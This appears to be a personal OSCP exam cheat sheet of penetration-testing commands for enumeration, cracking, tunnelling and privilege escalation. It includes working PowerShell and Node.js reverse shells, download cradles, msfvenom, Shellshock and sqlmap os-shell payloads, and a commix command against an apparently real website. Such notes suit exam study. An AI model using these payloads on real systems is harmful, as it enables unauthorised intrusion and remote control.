# EH Tools

My Personal Big Ol' List Of EH Tools For QR During The OSCP

-----------------------------------------

<!-- #### Good Repositories -->

#### IMPORTANT DIRECTORIES
/usr/share/wordlists
/usr/share/nmap/scripts
/usr/share/webshells
/usr/share/exploitdb

#### IMPORTANT CONFIG FILES
/etc/proxychains.conf
/etc/samba/smb.comf
/usr/share/doc/tmux/example_tmux.conf
.gitignore

#### ENUMERATION LISTS
##### PASSWORDS
* /usr/share/wordlists/fasttrack.txt
* /usr/share/wordlists/rockyou.txt

##### USERNAMES
* /usr/share/wordlists/wfuzz/other/names.txt

##### DIRECTORY NAMES
* /usr/share/wordlists/wfuzz/admin-panels.txt
* /usr/share/wordlists/wfuzz/admin-panels.txt
* /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
* /usr/share/wordlists/dirb/common.txt

##### ATTACK STRINGS
* /usr/share/wordlists/wfuzz/Injections/All_attack.txt

##### WEB TOOLS
https://base64.guru/converter/encode
https://text-compare.com/
https://www.prepostseo.com/tool/reverse-text-generator

-----------------------------------------

### TMUX
_tmux new dash session session dash name window_  
**`$`**` tmux new -s <session_name> -n <window_name>`

### RDESKTOP
_rdesktop dash g 90% ip_  
**`$`**` rdesktop -g 90% <host_ip>`

### UNZIP
_unzip file_  
**`$`**` unzip <file>`

### PING
_ping dash count 4 target_  
**`$`**` ping -c 4 <target>`

## FIND SUID & SGID 
_find from-here dash perm octal-val ignore-err_  

**`$`**` find . -perm /4000 2>/dev/null`  * _SUID_  
**`$`**` find . -perm /2000 2>/dev/null`  * _SGID_

* Kill A Listener By Port
**`$`**` kill -9 $(lsof -t -i:3000 -sTCP:LISTEN)`

### CHMOD
_change-mode user add execution file_  
**`$`**` chmod u+x <file>`  

### GET A File From HTTP
_wget url_  
**`$`**`wget <path_to_file>`  

_curl url_  
**`$`**`curl <path_to_file>`  

> TODO: poweshell dash command "(new-object)"
**`>`**`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<host>:<port>/<path_to_file>','<destination_filename>')"`  

> TODO: PS> copy-paste download all privesc files
**`>`**` powershell -c "$baseUrl = 'http://192.168xx.134:8000/' $files = 'dos_jaws.ps1','dos_wpc.exe','dos_wpc.py','dos_sherlock.ps1','dos_powerup.ps1' foreach ($file in $files) { Write-Host "Downloading $file" $dlUrl = "$($baseUrl)$file" $dlPath = "$($dir)$file" Invoke-WebRequest $dlUrl -OutFile $dlPath }"`  


### TELNET
_telnet target port_  
**`~$`**` telnet <target> <port>`

### SSH  
* Vanilla SSH Session  
_ssh user at target_  
**`~$`**` ssh <user>@<target>`

* Local Port Forwarding For Proxychains
**`~$`**`ssh -N -L [bind_address:]port:host:hostport [username@address]`

```
-L   : Local Port Forwarding (the port on the local host that will be forwarded to a remote address and port.)
-N   : Don't issue any commands?
-D   : Socks Proxy Switch
```

<!-- ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address> -->


### FTP
_ftp target_
**`~$`**` ftp <target>`

_wget dash ? ftp:// user : pass at target_
`~$ wget -m ftp://anonymous:anonymous@<target>` 

_filezilla target_
`~$ filezilla <target>`


### SMB
* NOT ALLOED ON OSCP  
_smbmap dash HOST target dash domain domain dash user dash pass_
**`~$`**` smbmap -H <target> -d <share?> -u '' -p ''`

### SMTP
**`kali@kali:~$`**` smtp-user-enum -M VRFY -D <domain> -U <user_list> -t <target> -v`

### DNS RECOND
**`kali@kali:~$`**` dnsrecon -d megacorpone.com -t axfr`


### SS
* What Ports Am I Listening On?  
_ss dash tlpn_
**`~$`**` ss -tlpn`  


* File Transfer (broadcast & retrieve)  
**`~$ / >`**` sudo socat TCP4-LISTEN:<port>,fork file:<filename>`  
**`~$ / >`**` socat TCP4:<ip>:<port> file:<filename>,create`


### POWERSHELL EMPIRE
**`~$`**` sudo /opt/empire`

### NBTSCAN
**`~$ / >`**` sudo nbtscan -v -r <target>`
> the <01> indicates the Master Browser service,the <00> the workstation,the <20> the File Server service and the <1e> and <1d> the Browser Service Elections and the Master Browser.

### SNMPWALK

### onesixtyone
**`kali@kali:~/pwk/exer$`**` echo public > community`  
**`kali@kali:~/pwk/exer$`**` echo private >> community`  
**`kali@kali:~/pwk/exer$`**` echo manager >> community`  
**`kali@kali:~/pwk/exer$`**` for ip in $(seq 1 254); do echo 10.11.1.$ip; done > full_range` 
**`kali@kali:~/pwk/exer$`**` onesixtyone -c community -i full_range`  

### ENUM4LINUX
`enum4linux -H <target>`

### NIKTO
`~$ nikto -host=<target> -maxtime=30s`


https://github.com/rkhal101/nmapAutomator


-----------------------------------------
## SHELLS

### SHELL ESCAPE & UPGRADE

One-Liners:
```
nmap       –interactive
ftp        !/bin/sh
gdb        !/bin/sh
more/less  !/bin/sh
vi         :!bash
vi         :set shell=/bin/bash:shell
awk        awk ‘BEGIN {system(“/bin/bash”)}’
find       find / -exec /usr/bin/awk ‘BEGIN {system(“/bin/bash”)}’ \;
perl       perl -e ‘exec “/bin/bash”;’
python     python -c 'import pty;pty.spawn("/bin/bash")'
           python -c 'import pty;import base64;pty.spawn(base64.b64decode("L2Jpbi9iYXNo"))'
           python -c 'exit_code = os.system('/bin/sh'); output = os.popen('/bin/sh').read()'
ruby       ruby -e 'exec "/bin/bash";'
php        php -r "system('/bin/bash');"
           php5 -r "system('/bin/bash');"
lua        os.execute('/bin/sh')
```

```js
var spawn = require('child_process').spawn;
var net = require('net');
var reconnect = require('reconnect');
reconnect(function (stream) {
    var ps = spawn('bash', [ '-i' ]);
    stream.pipe(ps.stdin);
    ps.stdout.pipe(stream, { end: false });
    ps.stderr.pipe(stream, { end: false });
    ps.on('exit', function () { stream.end() });
}).connect(1337, '192.168.119.134');
```

### REVERSE SHELLS

#### POWESHELL IEX
**`>`**` powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.1xx19.x4',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

#### Tiny php reverse shell



### MSFVENOM
`~$ msfvenom -l payloads | grep <anything>`
`~$ msfvenom -l formats`

`~$ msfvenom -p <payload_path> LHOST=<attacker> LPORT=<port> -f <filetype> -e <encoding> > <destination>`

```
Full Payload    :    windows/shell_reverse_tcp
Staged Payload  :    windows/shell/reverse_tcp

-b  : bad characters  (-b "\x00\x0a\x0d\x25\x26\x2b\x3d")
-f  : file type
-e  : encoding
```

```
EXAMPLES

BOF payload in C, encoded with bad characters
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
cd 
### METASPLOIT
* Quick Listener
`msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.xx34; set LPORT 1337; run; exit -y"`

### NETCAT
* Listener Mode  
**`~$ / >`**` nc -nlvp <port>`
* Connect Mode  
**`~$ / >`**` nc -nv <ip> <port>`

### SOCAT
* Listener Mode  
**`~$ / >`**` socat <protocol>:<port> STDOUT`
* Connect Mode  
**`~$ / >`**` socat - <protocol>:<ip>:<port>`



* R3vSh3ll3r

-----------------------------------------
## MONITORING

### TERMSHARK
**`~$`**` sudo termshark -i <interface>`

### TCPDUMP
**`~$`**` sudo tcpdump !!!!!!!!!???`

-----------------------------------------
## ENUMERATION

### NMAP
**`~$`**` sudo nmap <target>`
```
--top-ports <int>
```
### GOBUSTER
**`~$`**` sudo apt-get install gobuster`   
**`~$`**` gobuster -q -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt dir -u <server>`

``` 
-u   URL
-k   Ignore SSL
-x   file extensions (.html,.asp,..)
```

### DIRB
**`~$`**` sudo dirb <target> <wordlist_path> [options]`  
```
./dirb <url_base> [<wordlist_file(s)>] [options]

```


$ html2dic
dirb http://192.168.1.224/ /usr/share/wordlists/dirb/common.txt


### AUTORECON
`autorecon <target>`
```
-v                          verbose
--disable-sanity-checks     self explanatory?
```

### DIRBUSTER
* Basic Usage
**`~$`**` `


### MongoAudit
`~$ /home/kali/.local/bin/mongoaudit`

### HYDRA
**`~$`**` hydra -l <username> -p <password> <target> -t 4 <protocol>`  
**`~$`**` hydra -V -f -L <user_list> -P <pass_list> rdp://<target_ip>`


### SMBMAP
**`~$`**` smbmap -u <username> -p <password> -d <workgroup> -H <target>`

### SMBCLIENT
**`~$`**` smbclient `

mount -t cifs //<ip>/<share folder>$ /mnt -o user=<user>,pass=<password>,domain=<workdomain>

### ENUM4LINUX
**`~$`**` enum4linux <target>`

-----------------------------------------

## DATABASE
**`~$`**` mysql -u USERNAME -pPASSWORD -h HOSTNAMEORIP DATABASENAME`


-----------------------------------------
## WORDPRESS

wpscan

`wordpwn `

-----------------------------------------

## HASH CRACKING

### HASHCAT  
**`~$ / >`**` hashcat ... ... ... `
> https://hashcat.net/wiki/doku.php?id=example_hashes
`> .\hashcat64.exe -m 1800 hash .\rockyou.txt --force`


### JOHN

`~$ john –wordlist=cewl_1.txt –stdout –rules:add2nums > cewl_1_add2nums.txt`



### CEWL

`~$ cewl http://10.11.1.39/ -m 6 -w cewl_1.txt`

### CRUNCH
**`~$`**` crunch 24 24 -t ThisIsTheUsersPassword%% | less`


### RSMANGLER
rsmangler --file wordlist.txt --output output.txt

-----------------------------------------
## STEGANOGRAPHY
**`~$`**` stegcracker <img_path> <wordlist_path>`


## Site Tech Detection
`~$ whatweb -a4 <target>`
```
-a#    Agression level 1-4
```

## VULN TESTING & DISCOVERY

### SEARCHSPLOIT
**`~$`**` searchsploit –exclude="/dos/" <query>`  
**`~$`**` searchsploit -m <id>`  
**`~$`**` searchsploit -x <id>`


### Heartbleed
* sslyze  
**`~$`**` sslyze --heartbleed <target>`

### SHELLSHOCK
`~$ wget -U “() { test;};echo \”Content-type: text/plain\”; echo; /bin/bash -c ‘echo vulnerable'” http://192.xxx39/cgi-bin/status`

python shellshocker.py <target_url>


### COMMIX
commix.py --shellshock --verbose --url=http://www.mbp.szczecin.pl:8080/cgi-bin/wspd_cgi.sh/wo_ropis.p?IDRek=0602000302439

### Scan Sequence

## TUNNELING
```
"USING SSH BIND THRU MY:PORT : TARGET : PORT THROUGH USER @ PATSY"
ssh -N -L [bind_address:]port:host:hostport [username@address]
```

**`kali@kali:~$`**` sudo ssh -N -L 0.0.0.0:445:17xxx4.5:445 stut@192xxxx4.44`

## PRIVESC
* https://github.com/mzet-/linux-exploit-suggester





### Privledge Escalation Scripts
* ~/pwk/swamp/privesc/le.sh      # LinEnum.sh
* ~/pwk/swamp/privesc/lp.sh      # LinPEAS.sh
* ~/pwk/swamp/privesc/les.sh     # linux-exploit-suggester.sh
* ~/pwk/swamp/privesc/upc_1.sh   # unix-privesc-check.sh (Tim Brown)
* ~/pwk/swamp/privesc/upc_2.sh   # unix-privesc-check.sh (pentestmonkey)
* ~/pwk/swamp/privesc/wpc.exe    # windows-privesc-check.exe
* ~/pwk/swamp/privesc/wpc.py     # windows-privesc-check.py
* ~/pwk/swamp/privesc/kernelpop/ # kernelpop files


## WIRESHARK / TERMSHARK

* POrt filter:
`(tcp.port == 1234) or (tcp.port == 5678)`  
`ip.addr == 192.168.134.10`


### AV EVASION & Payload Injection

#### SHELLTER
`~$ sudo shellter`
```

```
#### macro_pack
https://github.com/sevagas/macro_pack.git
`> macro_pack`

## C
`~$ gcc`

### CROWBAR
`~$ crowbar -b rdp -s 192.168.86.61/32 -u victim -C /root/words.txt -n 1`


# TODO
* Cain & Abel
* L0phtcrack
* John the Ripper
* list: https://www.wondershare.com/password/password-cracker-tools.html
* list: https://sectools.org/tag/windows/
* ncftpls
* list: https://securitytrails.com/blog/kali-linux-penetration-testing-tools
* dig
* ettercap
* pth-winexe
* tmpmail - send anonymous memails
* list - all top level domains


## rinetd
`~$ cat /etc/rinetd.conf`
`~$ sudo service rinetd restart`


----------------------

## TABOO

### [SQLMAP](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
* Basic Usage
**`~$`**` sqlmap <target> <port>`
* Saves files in `/home/kali/.local/share/sqlmap/output/`
**`~$`**` sqlmap -u http://<target>/<injectable_file>?<injectable_param>=1 -p "<param>" --dbms=<dbms> --os-shell`  

* crawl a whole site
`~$ sqlmap -u <target> --forms --crawl=2 --risk=3`

./sqlmap.py -r search-test.txt -p tfUPass

```
--os-shell
--os-pwn
--dump
```

* MySQL Tamper Scripts
`--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor`

* MSSQL Tamper Scripts
`--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes`

* General Tamper Scripts
`--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes`


### NOSQLMAP
https://github.com/codingo/NoSQLMap

----------------------